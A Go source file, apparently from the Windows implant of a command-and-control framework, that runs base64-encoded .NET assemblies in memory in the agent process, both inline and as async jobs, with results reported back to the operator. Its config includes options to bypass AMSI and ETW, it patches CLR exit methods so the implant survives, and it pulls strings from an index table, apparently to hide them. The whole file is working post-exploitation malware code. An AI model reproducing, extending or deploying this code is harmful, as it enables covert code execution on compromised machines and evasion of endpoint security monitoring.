//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"sync"
	"time"
)

type IATemplate struct {
	Version   int      `json:"v"`
	Type      int      `json:"t"`
	Templates []string `json:"tpl"`
	Params    []string `json:"p"`
}

const (
	idxIAOsWindows     = 830
	idxIACmdName       = 831
	idxIACmdNameAsync  = 832
	idxIAJobPrefix     = 835
	idxIATerminated    = 836
	idxIAExitCodeLabel = 837
	idxIAFmtDoneCode   = 838
	idxIAFmtStartedID  = 839
)

func iaOsWindows() string    { return iaTpl(idxIAOsWindows) }
func iaCmdName() string      { return iaTpl(idxIACmdName) }
func iaCmdNameAsync() string { return iaTpl(idxIACmdNameAsync) }
func iaJobPrefix() string    { return iaTpl(idxIAJobPrefix) }
func iaTerminated() string   { return iaTpl(idxIATerminated) }
func iaExitCode() string     { return iaTpl(idxIAExitCodeLabel) }
func iaFmtDone() string      { return iaTpl(idxIAFmtDoneCode) }
func iaFmtStarted() string   { return iaTpl(idxIAFmtStartedID) }
func iaStatusRun() string    { return iaTpl(idxIAStatusRunning) }
func iaStatusFail() string   { return iaTpl(idxIAStatusFailed) }
func iaStatusKill() string   { return iaTpl(idxIAStatusKilled) }
func iaStatusDone() string   { return iaTpl(idxIAStatusCompleted) }

var (
	clrExecutionMutex sync.Mutex
	clrExecutionCount int
)

var (
	exitPreventionOnce sync.Once
	exitPrevention     *CLRExitPrevention
	exitMethodsPatched bool
)

func InitializeExitPrevention() {
	exitPreventionOnce.Do(func() {
		exitPrevention = NewCLRExitPrevention()
		if err := exitPrevention.PatchAllExitMethods(); err == nil {
			exitMethodsPatched = true
		}
	})
}

type InlineAssemblyCommand struct{}

func (c *InlineAssemblyCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
		var tpl IATemplate
		if err := json.Unmarshal([]byte(ctx.CurrentCommand.Data), &tpl); err == nil && tpl.Templates != nil {
			SetInlineAssemblyTemplate(tpl.Templates)
		} else {
			decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
			if err == nil {
				if err := json.Unmarshal(decoded, &tpl); err == nil {
					SetInlineAssemblyTemplate(tpl.Templates)
				}
			}
		}
	}

	osWindows := iaOsWindows()
	if runtime.GOOS != osWindows {
		return CommandResult{
			Output:   Err(E42),
			ExitCode: 1,
		}
	}

	clrExecutionMutex.Lock()
	clrExecutionCount++
	executionNumber := clrExecutionCount
	clrExecutionMutex.Unlock()

	InitializeExitPrevention()

	var output strings.Builder

	var configData string
	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
		configData = ctx.CurrentCommand.Data
	} else if len(args) > 0 {
		configData = strings.Join(args, " ")
	} else {
		return CommandResult{
			Output:   Err(E43),
			ExitCode: 1,
		}
	}

	var config struct {
		AssemblyB64 string   `json:"ab"`
		Arguments   []string `json:"ar"`
		AppDomain   string   `json:"ad"`
		BypassAMSI  bool     `json:"ba"`
		BypassETW   bool     `json:"be"`
		RevertETW   bool     `json:"re"`
		EntryPoint  string   `json:"ep"`
		UsePipe     bool     `json:"up"`
		PipeName    string   `json:"pm"`
	}

	if err := json.Unmarshal([]byte(configData), &config); err != nil {
		if _, decodeErr := base64.StdEncoding.DecodeString(configData); decodeErr == nil {
			config.AssemblyB64 = configData
			if len(args) > 1 {
				config.Arguments = args[1:]
			}
		} else {
			return CommandResult{
				Output:   Err(E44),
				ExitCode: 1,
			}
		}
	}

	assemblyBytes, err := base64.StdEncoding.DecodeString(config.AssemblyB64)
	if err != nil {
		return CommandResult{
			Output:   Err(E45),
			ExitCode: 1,
		}
	}

	assemblyOutput, exitCode := c.executeWindowsAssembly(assemblyBytes, config, executionNumber)

	output.WriteString(assemblyOutput)

	return CommandResult{
		Output:   output.String(),
		ExitCode: exitCode,
	}
}

// InlineAssemblyAsyncCommand handles async inline .NET assembly execution
type InlineAssemblyAsyncCommand struct {
	InlineAssemblyCommand
}

func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
		var tpl IATemplate
		if err := json.Unmarshal([]byte(ctx.CurrentCommand.Data), &tpl); err == nil && tpl.Templates != nil {
			SetInlineAssemblyTemplate(tpl.Templates)
		} else {
			decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
			if err == nil {
				if err := json.Unmarshal(decoded, &tpl); err == nil {
					SetInlineAssemblyTemplate(tpl.Templates)
				}
			}
		}
	}

	jobPrefixFmt := iaJobPrefix()
	jobID := fmt.Sprintf(jobPrefixFmt, time.Now().UnixNano())

	var currentCmd Command
	if ctx.CurrentCommand != nil {
		currentCmd = *ctx.CurrentCommand
		currentCmd.JobID = jobID
	}

	statusRun := iaStatusRun()
	job := &AssemblyJob{
		ID:          jobID,
		CommandID:   currentCmd.CommandID,
		CommandDBID: currentCmd.CommandDBID,
		AgentID:     currentCmd.AgentID,
		Name:        currentCmd.Filename,
		Status:      statusRun,
		StartTime:   time.Now(),
		CancelChan:  make(chan bool, 1),
		Command:     currentCmd,
	}

	assemblyJobManager.AddJob(job)

	cmdNameAsync := iaCmdNameAsync()
	jobInfo := JobInfo{
		ID:        jobID,
		StartTime: time.Now(),
		Filename:  currentCmd.Filename,
		Active:    true,
		Type:      cmdNameAsync,
	}

	if commandQueue != nil {
		commandQueue.mu.Lock()
		commandQueue.activeJobs[jobID] = jobInfo
		commandQueue.mu.Unlock()
	}

	go func() {
		defer func() {
			if r := recover(); r != nil {
				job.OutputMutex.Lock()
				statusFail := iaStatusFail()

				job.Status = statusFail
				job.Error = fmt.Errorf(ErrCtx(E52, fmt.Sprintf("%v", r)))
				endTime := time.Now()
				job.EndTime = &endTime
				job.Output.WriteString("\n" + ErrCtx(E52, fmt.Sprintf("%v", r)) + "\n")
				finalOutput := job.Output.String()
				job.OutputMutex.Unlock()

				crashResult := CommandResult{
					Output:      finalOutput,
					Error:       job.Error,
					ExitCode:    -1,
					CompletedAt: time.Now().Format(time.RFC3339),
					JobID:       jobID,
				}
				if resultManager != nil {
					resultManager.AddResult(&crashResult)
				}
			}
		}()

		var config struct {
			AssemblyB64 string   `json:"ab"`
			Arguments   []string `json:"ar"`
			AppDomain   string   `json:"ad"`
			BypassAMSI  bool     `json:"ba"`
			BypassETW   bool     `json:"be"`
			RevertETW   bool     `json:"re"`
			EntryPoint  string   `json:"ep"`
			UsePipe     bool     `json:"up"`
			PipeName    string   `json:"pm"`
		}

		if currentCmd.Data != "" {
			if err := json.Unmarshal([]byte(currentCmd.Data), &config); err != nil {
				job.OutputMutex.Lock()
				statusFail2 := iaStatusFail()

				job.Status = statusFail2
				job.Error = err
				job.Output.WriteString(Err(E44))
				endTime := time.Now()
				job.EndTime = &endTime
				job.OutputMutex.Unlock()
				return
			}
		}

		assemblyBytes, err := base64.StdEncoding.DecodeString(config.AssemblyB64)
		if err != nil {
			job.OutputMutex.Lock()
			statusFail3 := iaStatusFail()
			job.Status = statusFail3
			job.Error = err
			job.Output.WriteString(Err(E45))
			endTime := time.Now()
			job.EndTime = &endTime
			job.OutputMutex.Unlock()
			return
		}

		var exitCode int
		if runtime.GOOS == "windows" {
			tokenContext := captureCurrentAssemblyTokenContext()
			exitCode, err = c.executeWindowsAssemblyAsync(assemblyBytes, config, job, tokenContext)
		} else {
			err = fmt.Errorf(Err(E2))
			exitCode = -1
			job.OutputMutex.Lock()
			job.Output.WriteString(Err(E2) + "\n")
			job.OutputMutex.Unlock()
		}

		job.OutputMutex.Lock()
		endTime := time.Now()
		job.EndTime = &endTime

		terminated := iaTerminated()
		statusKill := iaStatusKill()
		statusFail4 := iaStatusFail()
		statusDone := iaStatusDone()
		exitCodeLabel := iaExitCode()
		fmtDone := iaFmtDone()

		if err != nil {
			if strings.Contains(err.Error(), terminated) {
				job.Status = statusKill
			} else {
				job.Status = statusFail4
				job.Error = err
				if !strings.Contains(job.Output.String(), err.Error()) {
					job.Output.WriteString("\n" + ErrCtx(E52, err.Error()) + "\n")
				}
			}
		} else {
			job.Status = statusDone
			if !strings.Contains(job.Output.String(), exitCodeLabel) {
				job.Output.WriteString(fmt.Sprintf(fmtDone, exitCode))
			}
		}

		finalOutput := job.Output.String()
		job.OutputMutex.Unlock()

		if commandQueue != nil {
			commandQueue.mu.Lock()
			if queueJob, exists := commandQueue.activeJobs[jobID]; exists {
				queueJob.Active = false
				commandQueue.activeJobs[jobID] = queueJob
			}
			commandQueue.mu.Unlock()
		}

		finalResult := CommandResult{
			Command:     currentCmd,
			Output:      finalOutput,
			ExitCode:    exitCode,
			CompletedAt: time.Now().Format(time.RFC3339),
			JobID:       jobID,
		}

		if resultManager != nil {
			resultManager.AddResult(&finalResult)
		}

	}()

	fmtStarted := iaFmtStarted()
	return CommandResult{
		Output:      fmt.Sprintf(fmtStarted, jobID),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
		JobID:       jobID,
	}
}
